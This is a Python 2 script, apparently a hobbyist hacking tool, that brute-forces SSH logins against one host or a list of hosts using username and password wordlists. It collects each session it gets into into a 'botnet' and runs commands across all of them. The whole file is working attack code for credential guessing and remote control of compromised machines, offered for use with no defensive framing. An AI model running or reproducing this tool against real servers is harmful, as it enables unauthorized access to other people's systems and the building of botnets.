#!/usr/bin/env python

import optparse
from pexpect import pxssh
import time
import getpass
from threading import Thread
time.sleep(1)
print "------------------------------------------------------------------------------------"
print "-----------<<<<<<<<<<<<<<<<<<<<<MADE BY JACK THE DOUGHT>>>>>>>>>>>>>>>>>------------"
print "------------------------------------------------------------------------------------"
time.sleep(2)
botnet = []

class Client:
    def __init__(self, host, user, password):
        self.host=host
        self.user=user
        self.password=password
        self.session=self.connect()

    def connect(self):
        try:
            child = pxssh.pxssh()
            child.login(self.host, self.user, self.password)
            return child
        except Exception as e:
            print '[-] Trying Host: ' + self.host + ' Username: '+ self.user + " password: " + self.password + ": " + str(e)
            pass

    def send_command(self, command):
        self.session.sendline(command)
        self.session.prompt()
        return self.session.before

def addClient(host, user, password):
    global botnet
    botnet.append(Client(host, user, password))
def botCommand(cmd):
    global botnet
    for client in botnet:
        output = client.send_command(cmd)
        print '[*] Output Form ' + client.host + ': ' + str(output)

def __onehostattack__(host, user, fuser, password, fpass):
    if user:
        __oneuserattack__(host, user, password, fpass)
    if fuser:
        fileuser = open(fuser, 'r')
        for use in fileuser.readlines():
            use = use.strip('\n')
            __oneuserattack__(host, use, password, fpass)
                
def __oneuserattack__(host, user, password, fpass):
    if password:
        addClient(host, user, password)
        time.sleep(2)
        try:
            botCommand('uname -v')
        except Exception as e:
            pass
    if fpass:
        with open(fpass, 'r') as filpass:
            for passwd in filpass.readlines():
                passwd = passwd.strip('\n')
                addClient(host, user, passwd)
                time.sleep(2)
                try:
                    botCommand('uname -v')
                except Exception as e:
                    pass
def main():
    parser = optparse.OptionParser('usage: %prog [options] arg1 arg2')
    parser.add_option('-H', '--Host', type='string', dest='tgHost', help="Specify target Host")
    parser.add_option('-u', '--User', type='string', dest='user', help = 'Specify a Username')
    group = optparse.OptionGroup(parser, "Dangerous: Hack Section ", "Caution: Use these Options at your own risk but enjoy it YOHOHOHOHOHO")
    group.add_option('-U', '--file-user', type='string', dest='fileus', help="Specify a file that contains User, that will be tested")
    group.add_option('-X', '--file-host', type='string', dest='filehos', help="Specify a file that contains Host, that will be tested")
    group.add_option('-P', '--file-pass', type='string', dest='filepass', help="Specify a file that contains Password, that will be tested")
    (options, args)=parser.parse_args()
    tgHost = options.tgHost
    user= options.user
    fileus = options.fileus
    filehos = options.filehos
    filepass = options.filepass
    if (tgHost==None) and (filehos==None):
        print parser.print_help()
        exit(0)
    elif (user==None) and (fileus==None):
        print parser.print_help()
        exit(0)
    elif filepass ==None:
        password = getpass.getpass()
    else:
        password = ""
    if tgHost:
        __onehostattack__(tgHost, user, fileus, password, filepass)
    if filehos:
        with open(filehos, 'r') as filehost:
            for host in filehost.readlines():
                targ = Thread(target=__onehostattack__, args=(host, user, fileus, password, filepass))
                targ.start()
                targ.join()
    
if __name__=='__main__':
    main()
